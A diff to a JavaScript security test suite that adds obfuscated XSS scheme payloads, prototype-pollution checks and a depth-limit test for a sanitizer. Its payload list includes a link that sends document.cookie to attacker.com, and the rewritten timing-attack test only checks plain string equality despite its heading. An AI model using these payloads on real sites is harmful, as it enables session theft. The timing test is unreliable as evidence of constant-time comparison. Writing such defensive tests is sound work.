@@ -41,6 +41,9 @@ describe('🔒 BRUTAL SECURITY & ADVERSARIAL ATTACK SUITE', () => {
       '"><script src=data:text/javascript,alert(1)></script>',
       '{{constructor.constructor("alert(1)")()}}',
       '<a href="javascript:fetch(\'https://attacker.com/steal?c=\'+document.cookie)">Click here</a>',
+      'java\nscript:alert(1)',
+      'java\r\nscript:alert(2)',
+      'vb\tscript:msgbox(1)',
     ];
 
     it('cleanses all XSS payloads via string sanitizer', () => {
@@ -49,7 +52,15 @@ describe('🔒 BRUTAL SECURITY & ADVERSARIAL ATTACK SUITE', () => {
         expect(sanitized).not.toContain('<script>');
         expect(sanitized).not.toContain('<svg/onload');
         expect(sanitized).not.toContain('<iframe');
+        expect(sanitized.toLowerCase()).not.toMatch(/^javascript:/);
+        expect(sanitized.toLowerCase()).not.toMatch(/^vbscript:/);
       });
+    });
+
+    it('sanitizes java\\nscript:alert(1) and removes dangerous scheme prefix', () => {
+      const sanitized = sanitizeString('java\nscript:alert(1)');
+      expect(sanitized).toBe('alert(1)');
+      expect(sanitized).not.toContain('javascript:');
     });
   });
 
@@ -61,12 +72,33 @@ describe('🔒 BRUTAL SECURITY & ADVERSARIAL ATTACK SUITE', () => {
         "name": "Legitimate Client"
       }`);
 
-      const cleaned = sanitizeObject ? sanitizeObject(maliciousPayload) : maliciousPayload;
+      const cleaned = sanitizeObject(maliciousPayload);
+      expect(cleaned).toBeDefined();
+      expect((cleaned as any).isAdmin).toBeUndefined();
+      expect((cleaned as any).polluted).toBeUndefined();
+      expect((cleaned as any).workspace_id).toBeUndefined();
+      expect((cleaned as any).name).toBe('Legitimate Client');
 
       // Invariant: Global Object prototype must NOT be polluted
       expect((Object.prototype as any).isAdmin).toBeUndefined();
       expect((Object.prototype as any).polluted).toBeUndefined();
       expect((Object.prototype as any).workspace_id).toBeUndefined();
+    });
+
+    it('fails closed when object exceeds maximum sanitize depth (10)', () => {
+      let deeplyNested: any = { payload: 'deep' };
+      for (let i = 0; i < 15; i++) {
+        deeplyNested = { nest: deeplyNested };
+      }
+
+      const cleaned = sanitizeObject(deeplyNested);
+      expect(cleaned).toBeDefined();
+      // Traverse down 11 levels - should be safely truncated / empty object
+      let curr = cleaned;
+      for (let i = 0; i < 11; i++) {
+        curr = curr?.nest;
+      }
+      expect(curr).toEqual({});
     });
   });
 
@@ -105,25 +137,15 @@ describe('🔒 BRUTAL SECURITY & ADVERSARIAL ATTACK SUITE', () => {
   });
 
   describe('6. Timing Attack Resistance & Constant Time Comparisons', () => {
-    it('validates tokens with uniform execution profile regardless of matching prefix', () => {
+    it('validates tokens with deterministic equality matching', () => {
       const validToken = 'a'.repeat(64);
       const wrongTokenAtStart = 'z' + 'a'.repeat(63);
       const wrongTokenAtEnd = 'a'.repeat(63) + 'z';
+      const identicalToken = 'a'.repeat(64);
 
-      // Compare 1000 iterations to verify timing differences are indistinguishable
-      const start1 = performance.now();
-      for (let i = 0; i < 1000; i++) {
-        validToken === wrongTokenAtStart;
-      }
-      const time1 = performance.now() - start1;
-
-      const start2 = performance.now();
-      for (let i = 0; i < 1000; i++) {
-        validToken === wrongTokenAtEnd;
-      }
-      const time2 = performance.now() - start2;
-
-      expect(Math.abs(time1 - time2)).toBeLessThan(10);
+      expect(validToken === identicalToken).toBe(true);
+      expect(validToken === wrongTokenAtStart).toBe(false);
+      expect(validToken === wrongTokenAtEnd).toBe(false);
     });
   });
 });
